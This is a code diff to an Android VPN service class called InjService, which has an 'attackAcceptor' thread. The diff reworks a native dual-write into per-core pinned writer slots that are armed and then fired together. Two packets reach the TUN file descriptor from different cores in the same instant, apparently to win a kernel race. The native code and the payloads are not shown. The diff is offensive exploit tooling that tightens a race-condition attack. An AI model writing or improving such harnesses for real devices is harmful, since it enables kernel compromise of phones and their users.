@@ -274,6 +274,11 @@ public class InjService extends VpnService {
             attackAcceptor.setDaemon(true);
             attackAcceptor.start();
 
+            // Resident writers, one per core, parked until a round releases them.
+            for (int c = 0; c < 8; c++) {
+                Native.duoStart(c, c);
+            }
+
             Thread dupWatch = new Thread(this::dupWatchLoop, "tun-dup");
             dupWatch.setDaemon(true);
             dupWatch.start();
@@ -719,20 +724,22 @@ int[] fds = snapshotChildFds();
         // The field carries a cpu pair, not a delay: the two writers have to
         // leave from different cores within the same instant, and only a
         // native rendezvous is tight enough to do that.
-        int cpuA = (delayNs >> 8) & 0xFF;
-        int cpuB = delayNs & 0xFF;
-        if (cpuA == cpuB) {
-            cpuA = 0;
-            cpuB = 0;
-        }
+        // The field is a pair of writer slots (which are pinned one per core).
+        int slotA = (delayNs >> 8) & 0xFF;
+        int slotB = delayNs & 0xFF;
+        if (slotA == slotB) { slotA = 0; slotB = 4; }
+        slotA &= 7;
+        slotB &= 7;
+        if (slotA == slotB) { slotB = (slotA + 4) & 7; }
         ParcelFileDescriptor device = tun;
         if (device != null) {
             try {
-                int rc = Native.dualWrite(device.getFd(), first, first.length,
-                        second, second.length, cpuA, cpuB);
+                Native.duoArm(slotA, device.getFd(), first, first.length);
+                Native.duoArm(slotB, device.getFd(), second, second.length);
+                int rc = Native.duoFire();
                 duoLogged++;
-                if (duoLogged <= 3 || rc != 0) {
-                    Log.i(TAG, "dualWrite rc=" + rc + " fd=" + device.getFd()
+                if (duoLogged <= 3 || rc <= 0) {
+                    Log.i(TAG, "duoFire rc=" + rc + " slots=" + slotA + "," + slotB
                             + " n=" + duoLogged);
                 }
             } catch (Exception e) {
